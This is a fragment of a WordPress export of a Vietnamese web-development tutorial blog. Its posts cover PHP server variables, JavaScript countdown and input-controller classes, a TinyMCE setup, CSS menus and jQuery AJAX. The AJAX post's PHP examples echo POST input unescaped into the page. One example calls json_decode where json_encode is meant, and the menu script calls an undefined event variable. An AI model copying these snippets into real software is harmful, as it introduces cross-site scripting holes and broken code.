<td>Trả về chuỗi query trang đang truy cập. (V&iacute; dụ trang truy cập l&agrave; http://domain.com/?page=news&amp;id=100 - n&oacute; trả về l&agrave; chuỗi query l&agrave;&nbsp;?page=news&amp;id=100)</td>
</tr>
<tr>
<td>$_SERVER['REQUEST_URI']</td>
<td>Trả về&nbsp;URI&nbsp;của trang.</td>
</tr>
<tr>
<td>$_SERVER['HTTP_HOST']</td>
<td>Trả về&nbsp;Host&nbsp;của trang, v&iacute; dụ&nbsp;xuanthulab.net.</td>
</tr>
<tr>
<td>$_SERVER['HTTP_REFERER']</td>
<td>Trang dẫn đến website của m&igrave;nh.&nbsp;C&oacute; thể d&ugrave;ng c&aacute;i n&agrave;y để biết người d&ugrave;ng v&agrave;o website qua google search với những từ kh&oacute;a n&agrave;o</td>
</tr>
<tr>
<td>$_SERVER['SCRIPT_NAME']</td>
<td>Trả về đường dẫn của file script php hiện tại.</td>
</tr>
<tr>
<td>$_SERVER['REQUEST_METHOD']</td>
<td>Trả về phương thức n&agrave;o truy vấn đến Server như&nbsp;POST, GET, HEAD, PUT</td>
</tr>
<tr>
<td>$_SERVER['REQUEST_TIME']</td>
<td>Trả về gi&aacute; trị thời gian timestamp l&agrave; l&uacute;c bắt đầu y&ecirc;u cầu được gửi đến Server</td>
</tr>
<tr>
<td>$_SERVER['HTTP_USER_AGENT']</td>
<td>Lấy User-Agent l&agrave; header của y&ecirc;u cầu gửi đến, qua c&aacute;i n&agrave;y c&oacute; thể biết được th&ocirc;ng tin như Tr&igrave;nh duyệt, Hệ điều h&agrave;nh, Thiết bị ... đang truy cập</td>
</tr>
<tr>
<td>$_SERVER['REMOTE_ADDR']</td>
<td>Lấy IP đang truy cập trang.</td>
</tr>
</tbody>
</table>

<h2>2. Biến $GLOBALS, $_REQUEST, $_SESSION, $_COOKIE, $_POST, $_GET và $_files</h2>
- $GLOBALS là một mảng chứa tất cả các tham chiếu đến các biến toàn cục (global). Với key của mảng là tên biến. Ví dụ bạn biết rằng $_SERVER là một biến toàn cục thì bạn có thể truy cập đến biến đó thông qua $GLOBALS['_SERVER'] như là một cách thức mới.
- $_REQUEST : Biến này là một mảng kết hợp, lưu trữ thông tin chứa trong biến $_GET, $_POST và $_COOKIE
- Biến $_SESSION lưu trữ thông tin phiên làm việc của PHP, $_COOKIE dữ liệu nhỏ do trình duyệt gửi lên.
]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>516</wp:post_id>
		<wp:post_date><![CDATA[2020-12-06 20:20:16]]></wp:post_date>
		<wp:post_date_gmt><![CDATA[2020-12-06 20:20:16]]></wp:post_date_gmt>
		<wp:post_modified><![CDATA[2020-12-06 20:20:16]]></wp:post_modified>
		<wp:post_modified_gmt><![CDATA[2020-12-06 20:20:16]]></wp:post_modified_gmt>
		<wp:comment_status><![CDATA[open]]></wp:comment_status>
		<wp:ping_status><![CDATA[open]]></wp:ping_status>
		<wp:post_name><![CDATA[url-trong-php]]></wp:post_name>
		<wp:status><![CDATA[publish]]></wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type><![CDATA[post]]></wp:post_type>
		<wp:post_password><![CDATA[]]></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
										<category domain="category" nicename="wordpress"><![CDATA[Wordpress]]></category>
						</item>
					<item>
		<title><![CDATA[JavaScript - Countdow]]></title>
		<link>https://duycode.com/2020/12/15/javascript-countdow/</link>
		<pubDate>Tue, 15 Dec 2020 06:10:22 +0000</pubDate>
		<dc:creator><![CDATA[admin]]></dc:creator>
		<guid isPermaLink="false">http://duycode.com/?p=544</guid>
		<description></description>
		<content:encoded><![CDATA[<h2>Tạo Class Countdown</h2>
<pre>
class Countdown {
    constructor(ids,specifyTime,speed) {
        this.start(ids,specifyTime,speed);
    }

    start(ids,specifyTime,speed){
        let now = new Date();
        let remainTime = specifyTime - now;
        if(remainTime<0) return false;
        this.output(remainTime,ids);

        setTimeout(()=>{
            this.start(ids,specifyTime,speed);
        },speed);
    }

    output(remainTime,ids){
        let times = {
            year: String(Math.floor(remainTime / (1000*60*60*24*365))).padStart(2,'0'),
            day: String(Math.floor(remainTime % (1000*60*60*24*365) / (1000*60*60*24))).padStart(2,'0'),
            hour: String(Math.floor(remainTime % (1000*60*60*24) / (1000*60*60))).padStart(2,'0'),
            minute: String(Math.floor(remainTime % (1000*60*60) / (1000*60))).padStart(2,'0'),
            second: String(Math.floor(remainTime % (1000*60) / 1000)).padStart(2,'0'),
            msecond: String(Math.floor(remainTime % 1000)).padStart(2,'0')
        };

        for(let key in ids){
            document.getElementById(ids[key]).innerHTML = times[key];
        }
    }
}
</pre>

<h2>Sử dụng</h2>
<pre>
let countdown = new Countdown(
    {day:"countdays",hour:"counthours",minute:"countmins",second:"countsecs"},
    new Date(2025,2,14,12,30),200
);
</pre>


]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>544</wp:post_id>
		<wp:post_date><![CDATA[2020-12-15 06:10:22]]></wp:post_date>
		<wp:post_date_gmt><![CDATA[2020-12-15 06:10:22]]></wp:post_date_gmt>
		<wp:post_modified><![CDATA[2020-12-15 06:10:22]]></wp:post_modified>
		<wp:post_modified_gmt><![CDATA[2020-12-15 06:10:22]]></wp:post_modified_gmt>
		<wp:comment_status><![CDATA[open]]></wp:comment_status>
		<wp:ping_status><![CDATA[open]]></wp:ping_status>
		<wp:post_name><![CDATA[javascript-countdow]]></wp:post_name>
		<wp:status><![CDATA[publish]]></wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type><![CDATA[post]]></wp:post_type>
		<wp:post_password><![CDATA[]]></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
										<category domain="category" nicename="front-end"><![CDATA[Front End]]></category>
						</item>
					<item>
		<title><![CDATA[JavaScript - Cấu hình Keyboard để làm Game]]></title>
		<link>https://duycode.com/2020/12/15/javascript-cau-hinh-keyboard-de-lam-game/</link>
		<pubDate>Tue, 15 Dec 2020 06:15:35 +0000</pubDate>
		<dc:creator><![CDATA[admin]]></dc:creator>
		<guid isPermaLink="false">http://duycode.com/?p=547</guid>
		<description></description>
		<content:encoded><![CDATA[<h2>Tạo Class</h2>
<pre>
class Controller {
    constructor() {
    }

    static delayControl(normalControl,delayControl,beforeDelay,timeDelay){
        let beforeControl = 0;
        let timeTouch = 0;
        let id = null;
        let loops;

        let loopTimer = () => {
            beforeControl = beforeControl + 5;
            timeTouch = timeTouch + 5;
            loops = setTimeout(()=>loopTimer(),5);
        };
        loopTimer();

        let checkTouchDevice = () => {
            return 'ontouchstart' in document;
        };

        if(checkTouchDevice()){
            document.addEventListener("touchstart", (event) => {
                id = event.target.id;
                if(id in normalControl) normalControl[id]();
            });
            document.addEventListener("touchend", () => {
                id = null;
            });
        }
        else {
            document.addEventListener("mousedown", (event) => {
                id = event.target.id;
                if(id in normalControl) normalControl[id]();
            });
            document.addEventListener("mouseup", () => {
                id = null;
            });

            document.addEventListener('keydown',(event)=>{
                id = event.code;
                if(id in normalControl) normalControl[id]();
            },true);
            document.addEventListener('keyup',()=>{
                id = null;
            },true);
        }

        let listenDelayControl = ()=>{
            if(id in delayControl){
                if(beforeControl > beforeDelay){
                    delayControl[id]();
                    timeTouch = 0;
                }
                else if(timeTouch > timeDelay){
                    delayControl[id]();
                }
                beforeControl = 0;
            }
            setTimeout(()=>listenDelayControl(),5);
        };
        listenDelayControl();
    }
}

</pre>

<h2>Sử dụng</h2>
<pre>
Controller.delayControl(
     {
         ArrowDown: () => this.brick.moveDown(),
         ArrowUp: () => this.brick.rotate(),
         Space: () => this.pauseGame(),
         Enter: () => this.nextGame(),
         "myCanvas": () => this.pauseGame(),
         "moveDown": ()=> this.brick.moveDown(),
         "Rotate": ()=> this.brick.rotate()
     },
     {
         ArrowLeft: () => this.brick.moveLeft(),
         ArrowRight: () => this.brick.moveRight(),
         "moveLeft": ()=> this.brick.moveLeft(),
         "moveRight": ()=> this.brick.moveRight()
     },40,200);

</pre>]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>547</wp:post_id>
		<wp:post_date><![CDATA[2020-12-15 06:15:35]]></wp:post_date>
		<wp:post_date_gmt><![CDATA[2020-12-15 06:15:35]]></wp:post_date_gmt>
		<wp:post_modified><![CDATA[2020-12-15 06:15:35]]></wp:post_modified>
		<wp:post_modified_gmt><![CDATA[2020-12-15 06:15:35]]></wp:post_modified_gmt>
		<wp:comment_status><![CDATA[open]]></wp:comment_status>
		<wp:ping_status><![CDATA[open]]></wp:ping_status>
		<wp:post_name><![CDATA[javascript-cau-hinh-keyboard-de-lam-game]]></wp:post_name>
		<wp:status><![CDATA[publish]]></wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type><![CDATA[post]]></wp:post_type>
		<wp:post_password><![CDATA[]]></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
										<category domain="category" nicename="front-end"><![CDATA[Front End]]></category>
						</item>
					<item>
		<title><![CDATA[JavaScript - WYSIWYG HTML Editor]]></title>
		<link>https://duycode.com/2020/12/15/javascript-editbox-html/</link>
		<pubDate>Tue, 15 Dec 2020 06:53:46 +0000</pubDate>
		<dc:creator><![CDATA[admin]]></dc:creator>
		<guid isPermaLink="false">http://duycode.com/?p=549</guid>
		<description></description>
		<content:encoded><![CDATA[<pre>
<textarea name="post_content" placeholder="Write content Here" id="post_content"></textarea>

<script src="//cdnjs.cloudflare.com/ajax/libs/tinymce/4.5.1/tinymce.min.js"></script>
<script type="text/javascript">
    tinymce.init({
        selector: '#post_content',
        height: 400,
        theme: 'modern',
        plugins: [
            'advlist autolink lists link image charmap print preview hr anchor pagebreak',
            'searchreplace wordcount visualblocks visualchars code fullscreen',
            'insertdatetime media nonbreaking save table contextmenu directionality',
            'emoticons template paste textcolor colorpicker textpattern imagetools'
        ],
        toolbar1: 'insertfile undo redo | styleselect | forecolor backcolor emoticons | bullist numlist | outdent indent',
        toolbar2: 'preview | source code | link image media | table',
        image_advtab: true
    });
</script>
</pre>]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>549</wp:post_id>
		<wp:post_date><![CDATA[2020-12-15 06:53:46]]></wp:post_date>
		<wp:post_date_gmt><![CDATA[2020-12-15 06:53:46]]></wp:post_date_gmt>
		<wp:post_modified><![CDATA[2020-12-15 06:53:46]]></wp:post_modified>
		<wp:post_modified_gmt><![CDATA[2020-12-15 06:53:46]]></wp:post_modified_gmt>
		<wp:comment_status><![CDATA[open]]></wp:comment_status>
		<wp:ping_status><![CDATA[open]]></wp:ping_status>
		<wp:post_name><![CDATA[javascript-editbox-html]]></wp:post_name>
		<wp:status><![CDATA[publish]]></wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type><![CDATA[post]]></wp:post_type>
		<wp:post_password><![CDATA[]]></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
										<category domain="category" nicename="front-end"><![CDATA[Front End]]></category>
						</item>
					<item>
		<title><![CDATA[CSS Base]]></title>
		<link>https://duycode.com/2020/12/15/css-reset/</link>
		<pubDate>Tue, 15 Dec 2020 09:23:02 +0000</pubDate>
		<dc:creator><![CDATA[admin]]></dc:creator>
		<guid isPermaLink="false">http://duycode.com/?p=554</guid>
		<description></description>
		<content:encoded><![CDATA[<h2>1. CSS reset</h2>
<pre>
* {
    margin: 0;
    padding: 0;
    border: 0;
    box-sizing: inherit;
}

html {
    font-size: 62.5%;
    box-sizing: border-box;
}

ol, ul {
    list-style: none;
}

table {
    border-collapse: collapse;
    border-spacing: 0;
}

pre, code {
    font-family: monospace, monospace;
}
</pre>

<h2>2. CSS Base</h2>
<pre>
.grid {
    width: 1200px;
    max-width: 100%;
    margin: 0 auto;
}
</pre>]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>554</wp:post_id>
		<wp:post_date><![CDATA[2020-12-15 16:23:02]]></wp:post_date>
		<wp:post_date_gmt><![CDATA[2020-12-15 09:23:02]]></wp:post_date_gmt>
		<wp:post_modified><![CDATA[2020-12-15 16:23:02]]></wp:post_modified>
		<wp:post_modified_gmt><![CDATA[2020-12-15 09:23:02]]></wp:post_modified_gmt>
		<wp:comment_status><![CDATA[open]]></wp:comment_status>
		<wp:ping_status><![CDATA[open]]></wp:ping_status>
		<wp:post_name><![CDATA[css-reset]]></wp:post_name>
		<wp:status><![CDATA[publish]]></wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type><![CDATA[post]]></wp:post_type>
		<wp:post_password><![CDATA[]]></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
										<category domain="category" nicename="css"><![CDATA[CSS]]></category>
						</item>
					<item>
		<title><![CDATA[Tạo Menu Bar - Có Reponsive, Dropdown 2 lớp]]></title>
		<link>https://duycode.com/2020/12/15/tao-menu-bar-co-reponsive-dropdown-2-lop/</link>
		<pubDate>Tue, 15 Dec 2020 17:59:19 +0000</pubDate>
		<dc:creator><![CDATA[admin]]></dc:creator>
		<guid isPermaLink="false">http://duycode.com/?p=556</guid>
		<description></description>
		<content:encoded><![CDATA[<h2>1. File index.html</h2>
<pre>
<!DOCTYPE html>
<html>

<head>
    <meta charset="utf-8">
    <title>MediHome Index</title>
    <meta name="description" content="">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
    <link href="https://fonts.googleapis.com/css2?family=Roboto:ital,wght@0,400;0,500;1,400;1,500&display=swap"
        rel="stylesheet">
    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
</head>

<body>
    <header>
        <div class="topnav" id="myTopnav">
            <div class="dropdown">
                <div><i class="fa fa-home"></i> Home </div>
            </div>
            <div class="dropdown">
                <div>News</div>
            </div>
            <div class="dropdown">
                <div class="dropdown-title">Dịch vụ</div>
                <div class="dropdown-content">
                    <div class="drop2">
                        <div class="drop2-title">Chăm sóc tại nhà</div>
                        <div class="drop2-content">
                            <div class="drop3">
                                <div class="drop3-title">Nhân viên y tế tại nhà</div>
                            </div>
                            <div class="drop3">
                                <div class="drop3-title">Xét nghiệm tại nhà</div>
                            </div>                          
                        </div>
                    </div>
                    <div class="drop2">
                        <div>Xe cấp cứu</div>
                    </div>
                    <div class="drop2">
                        <div class="drop2-title">Làm đẹp</div>
                        <div class="drop2-content">
                            <div class="drop3">
                                <div class="drop3-title">Tư vấn, chăm sóc da</div>
                            </div>
                            <div class="drop3">
                                <div class="drop3-title">Phẫu thuật thẩm mỹ</div>
                            </div>  
                            <div class="drop3">
                                <div class="drop3-title">Trung tâm MediSpa</div>
                            </div>  
                        </div>
                    </div>
                    <div class="drop2">
                        <div>Phần mềm quản lý bệnh nhân</div>
                    </div>
                </div>
            </div>
            <div class="dropdown">
                <div class="dropdown-title">Thiết bị y tế</div>
                <div class="dropdown-content">
                    <div class="drop2">
                        <div>Thuê máy thở, máy trợ thở</div>
                    </div>
                    <div class="drop2">
                        <div>Cửa hàng thiết bị y tế</div>
                    </div>
                </div>
            </div>
            <div class="dropdown">
                <div class="dropdown-title">Kiến thức y khoa</div>
                <div class="dropdown-content">
                    <div class="drop2">
                        <div>Đột quỵ não</div>
                    </div>
                    <div class="drop2">
                        <div>Dinh dưỡng</div>
                    </div>
                    <div class="drop2">
                        <div>Thở máy tại nhà</div>
                    </div>
                </div>
            </div>
            <div class="dropdown">
                <div>Liên hệ </div>
            </div>
            <div class="dropdown">
                <div>Tìm kiếm </div>
            </div>
            <div class="dropdown icon-menu">
                <div><i class="fa fa-bars"></i></div>
            </div>
        </div>

    </header>
    <main>
    </main>
    <footer>

    </footer>

</body>

</html>
</pre>

<h2>2. File css/style.css</h2>
<pre>
* {
    margin: 0;
    padding: 0;
    border: 0;
    font-size: 100%;
    box-sizing: border-box;
    -moz-box-sizing: border-box;
    -webkit-box-sizing: border-box;
}

body {
    max-width: 1200px;
    margin: 0 auto;
    font-family: 'Roboto', Arial, Tahoma, sans-serif;
}

/* ------------------menu-topnav------------------ */

.topnav {
    display: flex;
    flex-direction: column;
    position: relative;
    font-size: 17px;
    background-color: #333;
}

.dropdown.icon-menu {
    position: absolute;
    right: 0;
    top: 0;
    background-color: #444;
}

.dropdown:not(:first-child):not(:last-child) {
    cursor: pointer;
    display: none;
}

.dropdown>div:first-child {
    font-size: 17px;
    color: #f2f2f2;
    padding: 14px 16px;
}

.drop2>div:first-child, .drop3>div:first-child {
    font-size: 17px;
    color: black;
    padding: 14px 16px;
}

.dropdown:first-child>div {
    background-color: #4CAF50;
}

.dropdown .dropdown-title:hover, .dropdown-title.active {
    background-color: #444;
}

.drop2:hover>div:first-child, .drop2>.drop2-title.active {
    background-color: #666;
    color: white;
}

.drop3:hover>div:first-child {
    background-color: #888;
    color: white;
}

.dropdown-title::after {
    font-family: "FontAwesome";
    content: '\f067';
    color: #fff;
    float: right;
    margin-left: 5px;
    transition: 0.2s;
}

.dropdown-title.active::after,
.dropdown-title.active.show-hover.clicked::after {
    font-family: "FontAwesome";
    content: '\f068';
    transition: 0.2s;
    transform: rotate(180deg);
}

.drop2-title::after {
    font-family: "FontAwesome";
    content: '\f0da';
    color: black;
    float: right;
    margin-left: 5px;
    transition: 0.2s;
}

.drop2-title:hover::after {
    color: white;
    transition: 0s;
}

.drop2-title.clicked:hover::after {
    color: white;
    transition: 0.2s;
}

.drop2-title.active::after {
    color: white;
    transform: rotate(90deg);
    transition: 0.2s;
}

.drop3-title::before {
    content: '---';
    color: black;
    margin-left: 10px;
    margin-right: 10px;
}
.drop3-title:hover::before{
    color:white;
}

.dropdown-content, .drop2-content {
    display: none;
    position: relative;
    background-color: white;
    box-shadow: 0px 8px 16px 0px rgba(0, 0, 0, 0.2);
}

/* -------------Design for tablets------------- */

@media screen and (min-width: 768px) {}

/* -------------Design for desktop------------- */

@media screen and (min-width: 800px) {
    .topnav {
        flex-direction: row;
    }
    .topnav>div:not(:first-child):not(:last-child) {
        display: block;
        position: relative;
    }
    .dropdown-title::after, .dropdown-title.active.show-hover::after {
        font-family: "FontAwesome";
        content: '\F0D7';
        margin-left: 10px;
        margin-top: 2px;
        transform: rotate(0deg);
    }
    .dropdown-content {
        position: absolute;
        min-width: 250px;
        z-index: 1;
    }
    .dropdown-content>div {
        position: relative;
    }
    .drop2-content {
        position: absolute;
        left: 250px;
        top: 0;
        min-width: 250px;
        z-index: 1;
    }
    .drop2-content a::before {
        content: '---';
        color: black;
        margin-right: 5px;
        margin-left: 5px;
    }
}

/* -------------Design for large desktop------------- */

@media screen and (min-width: 1200px) {}
</pre>

<h2>3. File js/view.js</h2>
<pre>
$(document).ready(function () {

    $toggleMenuBar(".dropdown");
    $toggleMenuBar(".drop2");

    $('.icon-menu').click(function (e) {
        $(this).parent().children().not(':first,:last').slideToggle(150);
        e.stopPropagation();
    });

    $('body').click(function () {
        if ($(window).width() < 800) {
            $(".topnav").children().not(':first,:last').slideUp(150);
        }
    });
});

$toggleMenuBar = (dropMenu) => {
    $(dropMenu + "-title").click(function (e) {
        if ($(this).hasClass("show-hover")==false||$(this).hasClass("clicked")==true) {
            $(this).toggleClass("active");
            $(this).next().slideToggle(200);
        }

        $(this).addClass("clicked");
        $(dropMenu + "-title.clicked").not($(this)).removeClass("clicked");
        $(this).next().css("z-index", "initial");

        $(dropMenu + "-title.active").not($(this)).next().slideToggle(200);
        $(dropMenu + "-title.active").not($(this)).toggleClass("active");
        e.stopPropagation();
    });

    $(dropMenu).hover(
        function () {
            $title = $(this).children(dropMenu + "-title");
            $content = $(this).children(dropMenu + "-content");
            if ($(window).width() < 800) return;
            if ($title.hasClass("active") == false && $title.hasClass("clicked") == false) {
                $title.addClass("show-hover");
                $title.toggleClass("active");
                $content.toggle();
                $content.css("z-index", "99")
            }
            e.stopPropagation();

        },
        function () {
            $title = $(this).children(dropMenu + "-title");
            $content = $(this).children(dropMenu + "-content");
            if ($(window).width() < 800) {
                $title.removeClass("clicked");
                return;
            }
            if ($title.hasClass("show-hover") == true && $title.hasClass("clicked") == false) {
                $title.toggleClass("active");
                $content.toggle();
                $content.css("z-index", "initial");
            }
            $title.removeClass("show-hover").removeClass("clicked");
            e.stopPropagation();
        }
    );
}
</pre>]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>556</wp:post_id>
		<wp:post_date><![CDATA[2020-12-15 17:59:19]]></wp:post_date>
		<wp:post_date_gmt><![CDATA[2020-12-15 17:59:19]]></wp:post_date_gmt>
		<wp:post_modified><![CDATA[2020-12-15 17:59:19]]></wp:post_modified>
		<wp:post_modified_gmt><![CDATA[2020-12-15 17:59:19]]></wp:post_modified_gmt>
		<wp:comment_status><![CDATA[open]]></wp:comment_status>
		<wp:ping_status><![CDATA[open]]></wp:ping_status>
		<wp:post_name><![CDATA[tao-menu-bar-co-reponsive-dropdown-2-lop]]></wp:post_name>
		<wp:status><![CDATA[publish]]></wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type><![CDATA[post]]></wp:post_type>
		<wp:post_password><![CDATA[]]></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
										<category domain="category" nicename="javascript"><![CDATA[Javascript]]></category>
						</item>
					<item>
		<title><![CDATA[CSS Reponsive Menu]]></title>
		<link>https://duycode.com/2020/12/16/css-reponsive-menu/</link>
		<pubDate>Wed, 16 Dec 2020 15:08:19 +0000</pubDate>
		<dc:creator><![CDATA[admin]]></dc:creator>
		<guid isPermaLink="false">http://duycode.com/?p=559</guid>
		<description></description>
		<content:encoded><![CDATA[<pre>
<!DOCTYPE html>
<html>

<head>
    <meta charset="utf-8">
    <style type="text/css">
        body {
            margin: 0;
        }

        h2 {
            text-align: center;
        }

        .topnav {
            overflow: hidden;
            background-color: #333;
        }

        .topnav a {
            float: left;
            display: block;
            color: #f2f2f2;
            text-align: center;
            padding: 14px 16px;
            text-decoration: none;
            font-size: 17px;
        }

        .topnav a:hover {
            background-color: #5C5C5C;
        }

        .topnav .icon {
            display: none;
        }

        @media screen and (max-width: 768px) {
            .topnav a:not(:first-child) {
                display: none;
            }

            .topnav a.icon {
                float: right;
                display: block;
            }

            .topnav.responsive {
                position: relative;
            }

            .topnav.responsive .icon {
                position: absolute;
                right: 0;
                top: 0;
            }

            .topnav.responsive a {
                float: none;
                display: block;
                text-align: left;
            }
        }
    </style>
    <script>
        function myFunction() {
            var x = document.getElementById("myTopnav");
            if (x.className === "topnav") {
                x.className += " responsive";
            } else {
                x.className = "topnav";
            }
        }
    </script>
</head>

<body>
    <h2>Hướng dẫn tạo responsive navbar</h2>
    <div class="topnav" id="myTopnav">
        <a href="#home">Trang chủ</a>
        <a href="#news">Học lập trình online</a>
        <a href="#contact">Thủ thuật</a>
        <a href="#about">Liên hệ</a>
        <a href="javascript:void(0);" style="font-size:15px;" class="icon" onclick="myFunction()">&#9776;</a>
    </div>

    <div style="padding-left:16px">
        <p>Thay đổi kích cỡ màn hình để xem hiệu ứng!</p>
    </div>
</body>

</html>
</pre>]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>559</wp:post_id>
		<wp:post_date><![CDATA[2020-12-16 22:08:19]]></wp:post_date>
		<wp:post_date_gmt><![CDATA[2020-12-16 15:08:19]]></wp:post_date_gmt>
		<wp:post_modified><![CDATA[2020-12-16 22:08:19]]></wp:post_modified>
		<wp:post_modified_gmt><![CDATA[2020-12-16 15:08:19]]></wp:post_modified_gmt>
		<wp:comment_status><![CDATA[open]]></wp:comment_status>
		<wp:ping_status><![CDATA[open]]></wp:ping_status>
		<wp:post_name><![CDATA[css-reponsive-menu]]></wp:post_name>
		<wp:status><![CDATA[publish]]></wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type><![CDATA[post]]></wp:post_type>
		<wp:post_password><![CDATA[]]></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
										<category domain="category" nicename="css"><![CDATA[CSS]]></category>
						</item>
					<item>
		<title><![CDATA[AJAX - Asynchronous JavaScript and XML]]></title>
		<link>https://duycode.com/2020/12/27/ajax-asynchronous-javascript-and-xml/</link>
		<pubDate>Sun, 27 Dec 2020 03:48:54 +0000</pubDate>
		<dc:creator><![CDATA[admin]]></dc:creator>
		<guid isPermaLink="false">http://duycode.com/?p=575</guid>
		<description></description>
		<content:encoded><![CDATA[<h2>1. Tổng quan</h2>
<h3>1.1. Method: GET</h3>
<pre>
$.ajax({
    'url': "http://localhost:3000/admin/users/list",
    'method': "GET",
    'contentType': 'application/json'
})
    .done(function (result) {
    })
    .fail(function (error) {
    })
    .always(function () {
    });
</pre>



<h3>2.1. Phương thức AJAX với dữ liệu trả về dạng html</h3>
<pre>
$.ajax({
    type: 'POST',
    url: 'vidu.php',
    dataType: 'html',
    data: {
        abc: "content abc",
        def: "content def"
    }
}).done(function(ketqua) {
    $('#noidung').html(ketqua);
});




</pre>
-- File: vidu.php
<pre>
<?php
if (isset($_POST['id'])) {
    echo 'Bạn đã gửi dữ liệu ID = ' . $_POST['id'] . ' thành công';
} else {
    echo 'Không có dữ liệu được gửi sang';
}
?>
</pre>
<h3>2.2. Phương thức AJAX với dữ liệu trả về dạng JSON</h3>
<pre>
$.ajax({
    type: 'POST',
    url: 'data.php',
    data: {
        id: "1",
    },
    dataType: 'json',
    success: function(data) {
        if (data.complate == '1') {
            alert('Có dữ liệu gửi sang');
        } else {
            alert('Không có dữ liệu gửi sang');
        }
    },
    error: function() {
        alert('Có lỗi trong quá trình xử lý');
    }
});
</pre>

-- File: data.php
<pre>
<?php
$data = array(); 
if(isset($_POST['id']))
{
    $data['complate'] = '1';
}else{
    $data['complate'] = '0';
}
echo json_decode($data);
?>
</pre>

<h2>2. Ví dụ cách xử lý AJAX trên 1 trang</h2>
-- Ví dụ 1:
<pre>
<?php
if (isset($_POST['ajax']) && isset($_POST['name'])) {
    echo $_POST['name'];
    exit;
}
?>

<!doctype html>
<html>
<body>
    <input type='text' name='name' placeholder='Write here !!!' id='name'>
    <div id='response'></div>
    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
    <script>
        $(document).ready(function() {
            $('#name').keyup(function() {
                var value = $('#name').val();
                $.ajax({
                    type: 'post',
                    data: {
                        ajax: 1,
                        name: value
                    },
                    success: function(response) {
                        $('#response').text('You wrote : ' + response);
                    }
                });
            });
        });
    </script>
</body>
</html>
</pre>

-- Ví dụ 2
<pre>
<?php
if (isset($_POST['ajax']) && isset($_POST['checked'])) {
    $checked_arr = $_POST['checked'];

    echo json_encode($checked_arr);
    exit;
}
?>

<!doctype html>
<html>
<body>

    <form method='post' action>
        <input type='checkbox' value='JavaScript'> JavaScript <br />
        <input type='checkbox' value='PHP'> PHP <br />
        <input type='checkbox' value='jQuery'> jQuery <br />
        <input type='checkbox' value='AJAX'> AJAX <br />
        <input type='button' value='click' id='but'>
        <div id='response'></div>
    </form>
    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.2.1/jquery.min.js"></script>

    <script>
        $(document).ready(function() {
            $('#but').click(function() {
                var checkarr = [];
                $("input[type=checkbox]:checked").each(function(index, element) {
                    checkarr.push($(element).val());
                });
                if (checkarr.length > 0) {
                    $.ajax({
                        type: 'post',
                        data: {
                            ajax: 1,
                            checked: checkarr
                        },
                        dataType: 'json',
                        success: function(response) {
                            $('#response').text('Response : ' + JSON.stringify(response));
                        }
                    });
                }
            });
        });
    </script>
</body>
</html>
</pre>]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>575</wp:post_id>
		<wp:post_date><![CDATA[2020-12-27 03:48:54]]></wp:post_date>
		<wp:post_date_gmt><![CDATA[2020-12-27 03:48:54]]></wp:post_date_gmt>
		<wp:post_modified><![CDATA[2020-12-27 03:48:54]]></wp:post_modified>
		<wp:post_modified_gmt><![CDATA[2020-12-27 03:48:54]]></wp:post_modified_gmt>
		<wp:comment_status><![CDATA[open]]></wp:comment_status>
		<wp:ping_status><![CDATA[open]]></wp:ping_status>
		<wp:post_name><![CDATA[ajax-asynchronous-javascript-and-xml]]></wp:post_name>
		<wp:status><![CDATA[publish]]></wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type><![CDATA[post]]></wp:post_type>
		<wp:post_password><![CDATA[]]></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
										<category domain="category" nicename="front-end"><![CDATA[Front End]]></category>
						</item>
					<item>
		<title><![CDATA[JSON - JavaScript Object Notation]]></title>
		<link>https://duycode.com/2020/12/27/json-javascript-object-notation/</link>
		<pubDate>Sun, 27 Dec 2020 04:29:31 +0000</pubDate>
		<dc:creator><![CDATA[admin]]></dc:creator>
		<guid isPermaLink="false">http://duycode.com/?p=579</guid>
		<description></description>
		<content:encoded><![CDATA[Key: luôn luôn phải được đóng gói trong cặp dấu ngoặc kép, không phải ngoặc đơn, cũng không được phép là biến số (variable)
Value: Chỉ được phép là những dữ liệu cơ bản như numbers, strings, Boolean, array, object, null, không được phép là function, date, undefined hoặc là một biểu thức tính toán.
Không được phép tồn tại dấu phẩy cuối cùng như JavaScript Object.
